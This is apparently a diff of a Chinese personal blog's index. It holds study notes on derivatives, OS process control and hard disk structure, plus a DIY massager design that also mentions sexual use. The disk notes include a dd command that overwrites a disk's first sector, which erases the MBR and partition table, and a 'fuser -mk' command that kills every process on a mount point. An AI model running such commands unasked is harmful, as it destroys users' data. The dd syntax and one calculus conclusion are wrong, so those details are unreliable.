+    <content><![CDATA[<h3 id="导数要看做某一点附近的变化率而不是某一点的瞬时变化率因为瞬时没有意义">导数要看做某一点附近的变化率,而不是某一点的瞬时变化率,因为瞬时没有意义</h3>
+<ul>
+<li>瞬时是啥,能吃吗? <a id="more"></a> #### 导数完全体 <span class="math display">\[
+\frac{ds}{dt}(t)=\frac{s(t+dt)-s(t)}{dt}
+\]</span></li>
+</ul>
+<h3 id="符号d表明了就是要求d描述的值趋近于0时的结果">符号<span class="math inline">\(d\)</span>表明了就是要求<span class="math inline">\(d\)</span>描述的值趋近于0时的结果</h3>
+<ul>
+<li><span class="math inline">\(dt\)</span>表明<span class="math inline">\(t\)</span>趋近于零</li>
+<li>导数的本质并不是分数,而是当所求变化量越来越小时这个比值的极限</li>
+</ul>
+<h3 id="求一个函数stt3在t2时的导数">求一个函数<span class="math inline">\(s(t)=t^3\)</span>在<span class="math inline">\(t=2\)</span>时的导数</h3>
+<ul>
+<li>先写出导数完全体</li>
+</ul>
+<p><span class="math display">\[
+\frac{ds}{dt}(2)=\frac{s(2+dt)-s(2)}{dt}
+\]</span></p>
+<ul>
+<li><p><span class="math inline">\(\frac{ds}{dt}(2)\)</span>可表示为<span class="math inline">\(\frac{d(2^3)}{dt}\)</span></p></li>
+<li><p>再转换</p></li>
+</ul>
+<p><span class="math display">\[
+\frac{ds}{dt}(2)=\frac{(2+dt)^3-(2)^3}{dt}
+\]</span></p>
+<ul>
+<li>分步乘法</li>
+</ul>
+<p><span class="math display">\[
+\frac{ds}{dt}(2)=\frac{2^3+3(2)^2dt+3(2)(dt)^2+(dt)^3-2^3}{dt}
+\]</span></p>
+<ul>
+<li>化简</li>
+</ul>
+<p><span class="math display">\[
+\frac{ds}{dt}(2)=3(2)^2+3(2)dt+(dt)^2
+\]</span></p>
+<ul>
+<li>因为<span class="math inline">\(dt\)</span>趋近于零,所以任何数乘以<span class="math inline">\(0\)</span>都得零</li>
+</ul>
+<p><span class="math display">\[
+\frac{ds}{dt}(2)=3(2)^2
+\]</span></p>
+<ul>
+<li>得到结果</li>
+</ul>
+<p><span class="math display">\[
+\frac{ds}{dt}(2)=12
+\]</span></p>
+<h4 id="结论学完微积分后的本能想法不必从头推导">结论(学完微积分后的本能想法,不必从头推导)</h4>
+<p><span class="math display">\[
+\frac{ds}{dt}(2)=3(t)^2
+\]</span></p>
+<h3 id="基本的组合函数">基本的组合函数</h3>
+<h4 id="加法法则">加法法则</h4>
+
+<p><strong>口诀:组合函数加法就是先对其中的元素进行求导,再相加</strong></p>
+<img src="/%E5%BE%AE%E7%A7%AF%E5%88%86%E7%9A%84%E6%9C%AC%E8%B4%A8/%E5%8A%A0%E6%B3%95%E6%B3%95%E5%88%99.png" class="" title="[加法法则]">
+<h4 id="乘法法则">乘法法则</h4>
+<h5 id="处理乘积通过面积来思考会更合适">处理乘积通过面积来思考会更合适</h5>
+<img src="/%E5%BE%AE%E7%A7%AF%E5%88%86%E7%9A%84%E6%9C%AC%E8%B4%A8/%E4%B9%98%E6%B3%95%E6%B3%95%E5%88%99-%E7%9B%B4%E8%A7%82.png" class="" title="[乘法法则-直观]">
+<p><strong>口诀:前导后不导,后导前不导</strong></p>
+<img src="/%E5%BE%AE%E7%A7%AF%E5%88%86%E7%9A%84%E6%9C%AC%E8%B4%A8/%E4%B9%98%E6%B3%95%E6%B3%95%E5%88%99.png" class="" title="[乘法法则]">
+<h4 id="链式法则">链式法则</h4>
+<img src="/%E5%BE%AE%E7%A7%AF%E5%88%86%E7%9A%84%E6%9C%AC%E8%B4%A8/%E9%93%BE%E5%BC%8F%E6%B3%95%E5%88%99.png" class="" title="[链式 法则]">
+<h3 id="多元复合函数求导法则">多元复合函数求导法则</h3>
+<p>口诀:<strong>分段用乘, 分叉用加, 单路全导, 叉路偏导</strong></p>
 ]]></content>
       <categories>
-        <category>编程</category>
+        <category>数学</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>按摩器</title>
+    <url>/%E6%8C%89%E6%91%A9%E5%99%A8/</url>
+    <content><![CDATA[<h2 id="按摩器">按摩器</h2>
+<p>最近想做一个按摩器，可以用来放在背部用于按摩放松，也可以作为一个震动木马来刺激性高潮。</p>
+<h3 id="尺寸规格-尚不确定待测试的时候进行调整方便性测试">尺寸规格-尚不确定，待测试的时候进行调整，方便性测试</h3>
+<a id="more"></a>
+<h3 id="圆柱体-如果作为一个震动木马来使用的话它是非插入式的">圆柱体-如果作为一个震动木马来使用的话，它是非插入式的</h3>
+<ul>
+<li>外壳
+<ul>
+<li>长度:35cm //待测试</li>
+<li>直径:13cm //待测试</li>
+<li>外层海绵层厚度:1.5cm</li>
+<li>铝柱厚度:5mm //待测试，暂时无法知道是否达到承重标准</li>
+<li>中空直径:11cm</li>
+</ul></li>
+<li>内容物
+<ul>
+<li>12V电池组/11.1V笔记本电脑电池组</li>
+<li>12V转5V模块</li>
+<li>蓝牙模块</li>
+<li>wifi模块</li>
+<li>stm32f10x</li>
+<li>RS545-双振头马达-232克</li>
+<li>12V充电板</li>
+<li>电机驱动模块</li>
+<li>扬声器</li>
+<li>存储器/sd卡</li>
+</ul></li>
+</ul>
+<h3 id="该产品使用rs545为震源模块化设计可以买模块进行功能扩充">该产品使用RS545为震源，模块化设计，可以买模块进行功能扩充</h3>
+<h3 id="对于的重心偏移我想把中间的模块设置成可调整的样子类似于塑料束带使中间的器件可以偏移以手动调整重心">对于的重心偏移，我想把中间的模块设置成可调整的样子，类似于塑料束带使中间的器件可以偏移，以手动调整重心</h3>
+<h3 id="外部的承重铝管也可以作为天线使用大大增强设备的无线功能">外部的承重铝管也可以作为天线使用，大大增强设备的无线功能。</h3>
+<h3 id="通过stm32使用pwm对电机的转速进行控制通过蓝牙对stm32进行控制就可以做到对使用手机等支持蓝牙的外部设备对本设备进行控制">通过stm32使用pwm对电机的转速进行控制，通过蓝牙对stm32进行控制，就可以做到对使用手机等支持蓝牙的外部设备对本设备进行控制。</h3>
+<p>我还想使本设备可以进行歌曲播放的同时进行速度调整，声音越高，震频越大，声音越小，震频越小，使人感受到音乐的震感。</p>
+<p>现在只是整体架构，暂时使用blender进行模拟，后期会使用soildworks进行更真实的渲染。</p>
+<p>现在只有一个外部框架的模型，等我什么时候有设备进行soildworks建模了，再把它继续做下去</p>
+<img src="/%E6%8C%89%E6%91%A9%E5%99%A8/%E6%B5%B7%E7%BB%B5%E6%9C%A8%E9%A9%AC%E5%A4%96%E9%83%A8%E6%A1%86%E6%9E%B6_v1.png" class="" title="海绵木马外部框架_v1">
+]]></content>
+      <categories>
+        <category>生活</category>
       </categories>
   </entry>
   <entry>
@@ -2707,189 +2893,6 @@
       </categories>
   </entry>
   <entry>
-    <title>操作系统第五节课笔记-进程控制</title>
-    <url>/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%AC%AC%E4%BA%94%E8%8A%82%E8%AF%BE%E7%AC%94%E8%AE%B0-%E8%BF%9B%E7%A8%8B%E6%8E%A7%E5%88%B6/</url>
-    <content><![CDATA[<a href="/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%AC%AC%E4%BA%94%E8%8A%82%E8%AF%BE%E7%AC%94%E8%AE%B0-%E8%BF%9B%E7%A8%8B%E6%8E%A7%E5%88%B6/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%AC%AC%E4%BA%94%E8%8A%82%E8%AF%BE%E7%AC%94%E8%AE%B0-%E8%BF%9B%E7%A8%8B%E6%8E%A7%E5%88%B6.pdf" title="操作系统第五节课笔记-进程控制pdf文档下载">操作系统第五节课笔记-进程控制pdf文档下载</a>
-<a id="more"></a>
-<h1 id="进程控制">进程控制</h1>
-<h3 id="进程控制块-pcb">进程控制块-PCB</h3>
-<p>Process Control Block</p>
-<ul>
-<li>进程实体的一部分，拥有描述进程情况及控制进程运行所需的全部信息的记录性数据结构</li>
-<li>使一个在多道程序环境下不能独立运行的程序，成为一个能独立运行的基本单位，一个能与其它进程并发执行的进程</li>
-<li>操作系统<strong>控制和管理</strong>并发执行进程的依据</li>
-<li>进程存在的唯一标志</li>
-<li>常驻内存，且存放于操作系统开辟的专门区域-PCB区</li>
-</ul>
-<h4 id="进程控制块中的信息">进程控制块中的信息</h4>
-<ul>
-<li>进程标识符
-<ul>
-<li>内(pid)/外部(进程名)、父/子进程、用户标识符</li>
-</ul></li>
-<li>处理器调度信息
-<ul>
-<li>通用、PC、PSW、用户占指针寄存器</li>
-</ul></li>
-<li>进程调度信息
-<ul>
-<li>进程状态、进程优先级(静态优先级，动态优先级)、事件及其他</li>
-</ul></li>
-<li>进程控制信息
-<ul>
-<li>程序和数据地址、进程同步通信机制</li>
-<li>资源清单、链接指针、进程图</li>
-</ul></li>
-</ul>
-<h3 id="进程图进程树">进程图（进程树）</h3>
-<ul>
-<li>描述进程家族的有向树
-<ul>
-<li>结点/有向边</li>
-<li>父/子进程</li>
-<li>祖先进程/祖先</li>
-</ul></li>
-</ul>
-<p>知道进程的子进程有助于在知道父进程的情况下，杀死其子进程</p>
-<p>知道进程的祖先进程有助于当子进程被杀死后通知父进程</p>
-<h3 id="pcb的组织方式">PCB的组织方式</h3>
-<p>执行指针</p>
-<p>就绪队列指针</p>
-<p>阻塞队列指针</p>
-<p>空闲队列指针</p>
-<ul>
-<li>链接方式
-<ul>
-<li>通过链表查询队列</li>
-</ul></li>
-<li>索引方式
-<ul>
-<li>建立索引表用于查询队列</li>
-</ul></li>
-</ul>
-<h2 id="进程的创建与终止">进程的创建与终止</h2>
-<h3 id="引起创建进程的事件">引起创建进程的事件</h3>
-<ul>
-<li>用户登录
-<ul>
-<li>分时系统中，验证为合法的终端用户登录</li>
-</ul></li>
-<li>作业调度
-<ul>
-<li>批处理系统中作业调度到某作业</li>
-</ul></li>
-<li>提供服务
-<ul>
-<li>运行中的用户程序提出某种请求</li>
-</ul></li>
-<li>应用请求
-<ul>
-<li>基于用户进程的需要由其自身创建新进程</li>
-</ul></li>
-</ul>
-<h3 id="引起终止进程的事件">引起终止进程的事件</h3>
-<ul>
-<li>正常结束
-<ul>
-<li>批处理系统中的Halt，分时系统中的LogsOff</li>
-</ul></li>
-<li>异常结束
-<ul>
-<li>越界错误、保护错误</li>
-<li>特权指令错误</li>
-<li>非法指令错误</li>
-<li>运行超时、等待超时</li>
-<li>算数运算错、I/O故障</li>
-</ul></li>
-<li>外界干预
-<ul>
-<li>操作员或者操作系统干预
-<ul>
-<li>发送SIGKILL信号强制杀死</li>
-</ul></li>
-<li>父进程请求/终止</li>
-</ul></li>
-</ul>
-<h3 id="进程创建过程">进程创建过程</h3>
-<h4 id="create原语">Create()原语</h4>
-<ol type="1">
-<li>分配标识符，并申请空白进程控制块</li>
-<li>为新进程的程序和数据及用户占分配必要的内存空间
-<ol type="1">
-<li>所需内存大小问题</li>
-</ol></li>
-<li>初始化进程控制快
-<ol type="1">
-<li>自身/父进程标识符</li>
-<li>处理机状态/调度信息</li>
-</ol></li>
-<li>讲新进程插入到就绪队列</li>
-</ol>
-<h3 id="进程终止过程">进程终止过程</h3>
-<h4 id="terminate原语">Terminate()原语</h4>
-<ol type="1">
-<li>检索被终止进程PCB，读取其进程状态</li>
-<li>若其正处于执行状态，立即终止执行并设置调度标志为真，来重新调度其他进程</li>
-<li>终止子孙进程</li>
-<li><strong>资源归还</strong>-最重要的过程</li>
-<li>一处被终止进程PCB，等待其他程序查询利用</li>
-</ol>
-<h2 id="进程的阻塞与唤醒">进程的阻塞与唤醒</h2>
-<h3 id="引起进程阻塞的事件">引起进程阻塞的事件</h3>
-<ul>
-<li>请求系统服务
-<ul>
-<li>但不能立刻满足，需要阻塞自己等待系统服务的响应</li>
-</ul></li>
-<li>启动某种操作
-<ul>
-<li>某种动作是本进程下一个动作的前趋，不满足不能向后执行</li>
-</ul></li>
-<li>新数据尚未到达
-<ul>
-<li>相互合作的进程必须先获得另一方的进程数据才能继续</li>
-</ul></li>
-<li>无新工作可做
-<ul>
-<li>特定功能的系统进程当完成任务且当前暂无任务</li>
-</ul></li>
-</ul>
-<h3 id="引起进程唤醒的事件">引起进程唤醒的事件</h3>
-<ul>
-<li>系统服务满足</li>
-<li>操作完成</li>
-<li>数据到达</li>
-<li>新任务出现</li>
-</ul>
-<h3 id="进程阻塞过程">进程阻塞过程</h3>
-<h4 id="block原语">Block()原语</h4>
-<ol type="1">
-<li>先立即停止执行，把进程控制块中的现行状态由执行状态改为阻塞状态，并将它插入到对应的阻塞队列中</li>
-<li>转调度程序进程重新调度，将处理机分配给另一就绪进程，并进行切换</li>
-</ol>
-<h3 id="进程唤醒过程">进程唤醒过程</h3>
-<h4 id="wakeup原语">Wakeup()原语</h4>
-<p>首先把阻塞进程从等待该事件的阻塞进程队列中移出，将其PCB中的现行状态由阻塞改为就绪，并插入到就绪队列中</p>
-<h2 id="进程的挂起与激活">进程的挂起与激活</h2>
-<h3 id="进程挂起过程">进程挂起过程</h3>
-<h4 id="suspend过程">Suspend()过程</h4>
-<ol type="1">
-<li>检查被挂起进程的状态并修改和插入到对应队列</li>
-<li>复制PCB到指定域</li>
-<li>若被挂进程正在执行则转向调度程序重新调度</li>
-</ol>
-<h3 id="进程激活过程">进程激活过程</h3>
-<h4 id="activate原语">Activate()原语</h4>
-<ol type="1">
-<li>检查进程现行状态并修改和插队</li>
-<li>若有新进程进入就绪队列并采用了抢占式调度策略，则检查和决定是否重新调度</li>
-</ol>
-]]></content>
-      <categories>
-        <category>大学</category>
-      </categories>
-  </entry>
-  <entry>
     <title>操作系统第六节课笔记-进程同步</title>
     <url>/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%AC%AC%E5%85%AD%E8%8A%82%E8%AF%BE%E7%AC%94%E8%AE%B0-%E8%BF%9B%E7%A8%8B%E5%90%8C%E6%AD%A5/</url>
     <content><![CDATA[<a href="/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%AC%AC%E5%85%AD%E8%8A%82%E8%AF%BE%E7%AC%94%E8%AE%B0-%E8%BF%9B%E7%A8%8B%E5%90%8C%E6%AD%A5/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%AC%AC%E5%85%AD%E8%8A%82%E8%AF%BE%E7%AC%94%E8%AE%B0-%E8%BF%9B%E7%A8%8B%E5%90%8C%E6%AD%A5.pdf" title="操作系统第六节课笔记-进程同步pdf文档下载">操作系统第六节课笔记-进程同步pdf文档下载</a>
@@ -3688,47 +3691,53 @@ P(AB)=\frac{AB中基本事件数}{S中基本事件数}
       </categories>
   </entry>
   <entry>
-    <title>按摩器</title>
-    <url>/%E6%8C%89%E6%91%A9%E5%99%A8/</url>
-    <content><![CDATA[<h2 id="按摩器">按摩器</h2>
-<p>最近想做一个按摩器，可以用来放在背部用于按摩放松，也可以作为一个震动木马来刺激性高潮。</p>
-<h3 id="尺寸规格-尚不确定待测试的时候进行调整方便性测试">尺寸规格-尚不确定，待测试的时候进行调整，方便性测试</h3>
-<a id="more"></a>
-<h3 id="圆柱体-如果作为一个震动木马来使用的话它是非插入式的">圆柱体-如果作为一个震动木马来使用的话，它是非插入式的</h3>
-<ul>
-<li>外壳
-<ul>
-<li>长度:35cm //待测试</li>
-<li>直径:13cm //待测试</li>
-<li>外层海绵层厚度:1.5cm</li>
-<li>铝柱厚度:5mm //待测试，暂时无法知道是否达到承重标准</li>
-<li>中空直径:11cm</li>
-</ul></li>
-<li>内容物
-<ul>
-<li>12V电池组/11.1V笔记本电脑电池组</li>
-<li>12V转5V模块</li>
-<li>蓝牙模块</li>
-<li>wifi模块</li>
-<li>stm32f10x</li>
-<li>RS545-双振头马达-232克</li>
-<li>12V充电板</li>
-<li>电机驱动模块</li>
-<li>扬声器</li>
-<li>存储器/sd卡</li>
-</ul></li>
-</ul>
-<h3 id="该产品使用rs545为震源模块化设计可以买模块进行功能扩充">该产品使用RS545为震源，模块化设计，可以买模块进行功能扩充</h3>
-<h3 id="对于的重心偏移我想把中间的模块设置成可调整的样子类似于塑料束带使中间的器件可以偏移以手动调整重心">对于的重心偏移，我想把中间的模块设置成可调整的样子，类似于塑料束带使中间的器件可以偏移，以手动调整重心</h3>
-<h3 id="外部的承重铝管也可以作为天线使用大大增强设备的无线功能">外部的承重铝管也可以作为天线使用，大大增强设备的无线功能。</h3>
-<h3 id="通过stm32使用pwm对电机的转速进行控制通过蓝牙对stm32进行控制就可以做到对使用手机等支持蓝牙的外部设备对本设备进行控制">通过stm32使用pwm对电机的转速进行控制，通过蓝牙对stm32进行控制，就可以做到对使用手机等支持蓝牙的外部设备对本设备进行控制。</h3>
-<p>我还想使本设备可以进行歌曲播放的同时进行速度调整，声音越高，震频越大，声音越小，震频越小，使人感受到音乐的震感。</p>
-<p>现在只是整体架构，暂时使用blender进行模拟，后期会使用soildworks进行更真实的渲染。</p>
-<p>现在只有一个外部框架的模型，等我什么时候有设备进行soildworks建模了，再把它继续做下去</p>
-<img src="/%E6%8C%89%E6%91%A9%E5%99%A8/%E6%B5%B7%E7%BB%B5%E6%9C%A8%E9%A9%AC%E5%A4%96%E9%83%A8%E6%A1%86%E6%9E%B6_v1.png" class="" title="海绵木马外部框架_v1">
+    <title>硬盘相关知识</title>
+    <url>/%E7%A1%AC%E7%9B%98%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86/</url>
+    <content><![CDATA[<h3 id="硬盘">硬盘</h3>
+<h4 id="机械式硬盘">机械式硬盘</h4>
+<p>由磁片,磁头构成,磁盘按扇区划分 机械式磁盘可以由多个磁盘片构成 每个磁盘片相同位置的扇区,每个大小512Byte构成的一个空心圆柱叫做柱面 为了实现快速数据读写,硬盘往往会多个磁头向多个磁盘片同时写入数据 同一个文件,会被写到多个磁盘片内</p>
+<h4 id="低级格式化">低级格式化</h4>
+<p>划分磁道,扇区</p>
+<h4 id="磁道">磁道</h4>
+<p>磁头在磁盘掠过的每个圆环叫一个磁道,每个磁道可以分成若干个扇区.</p>
+<h4 id="扇区">扇区</h4>
+<p>扇区,每个大小为512Byte,历史中的每个扇区的大小为512Byte,但是随着技术发展,大家约定俗成的扇区大小变成了4096Byte,但是为了兼容以前的操作系统,磁盘允许每个4096Byte扇区虚拟为八个512Byte,如果所有数据都是从4096Byte扇区的头512Byte开始写入,而不是从后3584Byte中开始写入,这叫做4K对齐 如果从后7个虚拟扇区开始写入,就叫做4K不对齐 4K对齐的好处很多,比如数据写入速度变快,因为扇区的大小越大,所形成的扇区数就明显变少,超过扇区大小的数据存储在多个块中时,所需要操作系统寻找的扇区变少,数据能更快的存储 如果仍然使用512为一块/簇,会造成写入速度极慢</p>
+<h4 id="柱面">柱面</h4>
+<p>每个硬盘都会有许多块磁片,可以同时写入,加快写入效率,缺点就是,一但有一片瓷片损坏,整个硬盘数据都会发生损坏,整个柱面都是不可用的</p>
+<h4 id="块block">块/block</h4>
+<p>windows中,存储数据以簇为单位,linux中,以块为单位(只是叫法不同,但是实际含义都是一个意思),系统中常常规定多少个扇区为一个簇(块),因为一个扇区的大小为512b,所以簇(块)必须为扇区的整数倍,常见的簇(块)大小为1024b,2048b,4096b(4k最常用) 每个块/簇由2^n倍的扇区构成</p>
+<h4 id="主引导记录mbr">主引导记录mbr</h4>
+<p>零磁道,零扇区 512Byte,叫做主引导记录 这个存储空间被划分为三个片段 446Byte:bootloader 启动器,一段代码程序,用于从分区中加载内核(kernel) 64Byte: 16Byte: 用于标识一个分区 最高四个分区,16Byte*4 2Byte: 魔数 标记mbr是否有效</p>
+<h4 id="电脑的启动过程">电脑的启动过程</h4>
+<p>主板加电,bios程序读入内存,cpu执行bios程序,bios自检程序完成后,加载用户定义的启动顺序 开始寻找磁盘上的mbr,当找到有效的mbr后,bios把mbr存储的bootloader加载入内存,bios程序退出,bootloader开始执行 找到预定的特定分区,寻找操作系统的内核,加载入内存,完成内核的解压缩,运行在内存上,bootloader退出,内核开始工作 内核被加载入特权级0的区域</p>
+<p><a href="http://huaqianlee.github.io/2015/08/21/Linux/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Linux%E5%90%AF%E5%8A%A8%E8%BF%87%E7%A8%8B/" target="_blank" rel="noopener">深入理解Linux启动过程</a> <a href="http://c.biancheng.net/view/1016.html" target="_blank" rel="noopener">Linux内核的加载过程</a> <a href="https://blog.51cto.com/linuxzj/1409882" target="_blank" rel="noopener">initrd 和 initramfs</a></p>
+<h4 id="扩展分区">扩展分区</h4>
+<p>存储于硬盘mbr,存储一个指针指向另一个地址,用于绑定扩展分区</p>
+<h4 id="分区">分区</h4>
+<p>一个硬盘被分成若干个逻辑块,用标号进行标识分区,例如sdX</p>
+<h4 id="高级格式化">高级格式化</h4>
+<p>用于创建文件系统,mk2fs</p>
+<h4 id="文件系统">文件系统</h4>
+<p>也是程序的一种,他负责文件的增删改查 文件系统分为几个部分,磁盘引导,超级块,inode池,数据存储区</p>
+<h4 id="inode">inode</h4>
+<p>inode用于记录文件的一些属性,包括修改时间,创建时间,文件数据块的位置,硬链接数,权限,UID,GID等,但不记录文件名,文件名由文件夹记录 详细请下载linuxkernel 在include/linux struct inode结构体中有详细声明</p>
+<h4 id="inode-table">inode table</h4>
+<p>文件系统中专门分出用于存储inode文件的地方,inode文件每个大小一般为128Byte或256Byte,inode数量在创建文件系统时给出,按照一定比例生成inode,比如两个块一个inode</p>
+<h4 id="位图bitmap">位图/Bitmap</h4>
+<p>使用1/0来记录块是否被使用,使用inode的原因是,便于操作系统识别未使用过的系统资源,方便检索 block bitmap:记录块的使用情况 inode bitmap:记录inode的使用情况</p>
+<h4 id="超级块super-block">超级块/Super Block</h4>
+<p>开头的第一个byte是byte 0，从 byte 1024开始往后的一部分数据。超级块中的数据其实就是文件卷的控制信息部分，也可以说它是卷资源表，有关文件卷的大部分信息都保存在这里。例如：硬盘分区中每个block的大小、硬盘分区上一共有多少个block group、以及每个block group中有多少个inode.超级块存在备份,创建文件系统的时候被随机备份于若干块中,若分区superblock被破坏,可以使用备份块恢复</p>
+<h4 id="vfs">vfs</h4>
+<p>不同文件系统的协调器,给出了一个统一接口</p>
+<h4 id="分区命令">分区命令</h4>
+<p>fdisk 指定硬盘 m为操作方法</p>
+<h4 id="安全卸载硬盘">安全卸载硬盘</h4>
+<p>要先杀死所有在分区上运行着的程序 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">fuser -mk 挂载点</span><br></pre></td></tr></table></figure></p>
+<h4 id="重新分区">重新分区</h4>
+<p>需要先把硬盘第一个分区(MBR)的所有信息清除 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dd -<span class="keyword">if</span> /dev/zero -of 硬盘设备文件 bs=512 count=1</span><br></pre></td></tr></table></figure></p>
 ]]></content>
       <categories>
-        <category>生活</category>
+        <category>硬件</category>
       </categories>
   </entry>
   <entry>
@@ -4112,155 +4121,6 @@ A\overrightarrow{x}=\overrightarrow{v}
 ]]></content>
       <categories>
         <category>answer&amp;question</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>硬盘相关知识</title>
-    <url>/%E7%A1%AC%E7%9B%98%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86/</url>
-    <content><![CDATA[<h3 id="硬盘">硬盘</h3>
-<h4 id="机械式硬盘">机械式硬盘</h4>
-<p>由磁片,磁头构成,磁盘按扇区划分 机械式磁盘可以由多个磁盘片构成 每个磁盘片相同位置的扇区,每个大小512Byte构成的一个空心圆柱叫做柱面 为了实现快速数据读写,硬盘往往会多个磁头向多个磁盘片同时写入数据 同一个文件,会被写到多个磁盘片内</p>
-<h4 id="低级格式化">低级格式化</h4>
-<p>划分磁道,扇区</p>
-<h4 id="磁道">磁道</h4>
-<p>磁头在磁盘掠过的每个圆环叫一个磁道,每个磁道可以分成若干个扇区.</p>
-<h4 id="扇区">扇区</h4>
-<p>扇区,每个大小为512Byte,历史中的每个扇区的大小为512Byte,但是随着技术发展,大家约定俗成的扇区大小变成了4096Byte,但是为了兼容以前的操作系统,磁盘允许每个4096Byte扇区虚拟为八个512Byte,如果所有数据都是从4096Byte扇区的头512Byte开始写入,而不是从后3584Byte中开始写入,这叫做4K对齐 如果从后7个虚拟扇区开始写入,就叫做4K不对齐 4K对齐的好处很多,比如数据写入速度变快,因为扇区的大小越大,所形成的扇区数就明显变少,超过扇区大小的数据存储在多个块中时,所需要操作系统寻找的扇区变少,数据能更快的存储 如果仍然使用512为一块/簇,会造成写入速度极慢</p>
-<h4 id="柱面">柱面</h4>
-<p>每个硬盘都会有许多块磁片,可以同时写入,加快写入效率,缺点就是,一但有一片瓷片损坏,整个硬盘数据都会发生损坏,整个柱面都是不可用的</p>
-<h4 id="块block">块/block</h4>
-<p>windows中,存储数据以簇为单位,linux中,以块为单位(只是叫法不同,但是实际含义都是一个意思),系统中常常规定多少个扇区为一个簇(块),因为一个扇区的大小为512b,所以簇(块)必须为扇区的整数倍,常见的簇(块)大小为1024b,2048b,4096b(4k最常用) 每个块/簇由2^n倍的扇区构成</p>
-<h4 id="主引导记录mbr">主引导记录mbr</h4>
-<p>零磁道,零扇区 512Byte,叫做主引导记录 这个存储空间被划分为三个片段 446Byte:bootloader 启动器,一段代码程序,用于从分区中加载内核(kernel) 64Byte: 16Byte: 用于标识一个分区 最高四个分区,16Byte*4 2Byte: 魔数 标记mbr是否有效</p>
-<h4 id="电脑的启动过程">电脑的启动过程</h4>
-<p>主板加电,bios程序读入内存,cpu执行bios程序,bios自检程序完成后,加载用户定义的启动顺序 开始寻找磁盘上的mbr,当找到有效的mbr后,bios把mbr存储的bootloader加载入内存,bios程序退出,bootloader开始执行 找到预定的特定分区,寻找操作系统的内核,加载入内存,完成内核的解压缩,运行在内存上,bootloader退出,内核开始工作 内核被加载入特权级0的区域</p>
-<p><a href="http://huaqianlee.github.io/2015/08/21/Linux/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Linux%E5%90%AF%E5%8A%A8%E8%BF%87%E7%A8%8B/" target="_blank" rel="noopener">深入理解Linux启动过程</a> <a href="http://c.biancheng.net/view/1016.html" target="_blank" rel="noopener">Linux内核的加载过程</a> <a href="https://blog.51cto.com/linuxzj/1409882" target="_blank" rel="noopener">initrd 和 initramfs</a></p>
-<h4 id="扩展分区">扩展分区</h4>
-<p>存储于硬盘mbr,存储一个指针指向另一个地址,用于绑定扩展分区</p>
-<h4 id="分区">分区</h4>
-<p>一个硬盘被分成若干个逻辑块,用标号进行标识分区,例如sdX</p>
-<h4 id="高级格式化">高级格式化</h4>
-<p>用于创建文件系统,mk2fs</p>
-<h4 id="文件系统">文件系统</h4>
-<p>也是程序的一种,他负责文件的增删改查 文件系统分为几个部分,磁盘引导,超级块,inode池,数据存储区</p>
-<h4 id="inode">inode</h4>
-<p>inode用于记录文件的一些属性,包括修改时间,创建时间,文件数据块的位置,硬链接数,权限,UID,GID等,但不记录文件名,文件名由文件夹记录 详细请下载linuxkernel 在include/linux struct inode结构体中有详细声明</p>
-<h4 id="inode-table">inode table</h4>
-<p>文件系统中专门分出用于存储inode文件的地方,inode文件每个大小一般为128Byte或256Byte,inode数量在创建文件系统时给出,按照一定比例生成inode,比如两个块一个inode</p>
-<h4 id="位图bitmap">位图/Bitmap</h4>
-<p>使用1/0来记录块是否被使用,使用inode的原因是,便于操作系统识别未使用过的系统资源,方便检索 block bitmap:记录块的使用情况 inode bitmap:记录inode的使用情况</p>
-<h4 id="超级块super-block">超级块/Super Block</h4>
-<p>开头的第一个byte是byte 0，从 byte 1024开始往后的一部分数据。超级块中的数据其实就是文件卷的控制信息部分，也可以说它是卷资源表，有关文件卷的大部分信息都保存在这里。例如：硬盘分区中每个block的大小、硬盘分区上一共有多少个block group、以及每个block group中有多少个inode.超级块存在备份,创建文件系统的时候被随机备份于若干块中,若分区superblock被破坏,可以使用备份块恢复</p>
-<h4 id="vfs">vfs</h4>
-<p>不同文件系统的协调器,给出了一个统一接口</p>
-<h4 id="分区命令">分区命令</h4>
-<p>fdisk 指定硬盘 m为操作方法</p>
-<h4 id="安全卸载硬盘">安全卸载硬盘</h4>
-<p>要先杀死所有在分区上运行着的程序 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">fuser -mk 挂载点</span><br></pre></td></tr></table></figure></p>
-<h4 id="重新分区">重新分区</h4>
-<p>需要先把硬盘第一个分区(MBR)的所有信息清除 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dd -<span class="keyword">if</span> /dev/zero -of 硬盘设备文件 bs=512 count=1</span><br></pre></td></tr></table></figure></p>
-]]></content>
-      <categories>
-        <category>硬件</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>计算机网络第一节课笔记</title>
-    <url>/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E7%AC%AC%E4%B8%80%E8%8A%82%E8%AF%BE%E7%AC%94%E8%AE%B0/</url>
-    <content><![CDATA[<a href="/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E7%AC%AC%E4%B8%80%E8%8A%82%E8%AF%BE%E7%AC%94%E8%AE%B0/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E7%AC%AC%E4%B8%80%E8%8A%82%E8%AF%BE%E7%AC%94%E8%AE%B0.pdf" title="计算机网络第一节课笔记pdf文档下载">计算机网络第一节课笔记pdf文档下载</a>
-<a id="more"></a>
-<h1 id="计算机网络第一节课">计算机网络第一节课</h1>
-<h3 id="网络分类">网络分类</h3>
-<ul>
-<li>从逻辑上看,计算机网络分为资源子网和通信子网</li>
-</ul>
-<h3 id="互联网起源">互联网起源</h3>
-<ul>
-<li>美国的阿帕网(ARPANET)</li>
-</ul>
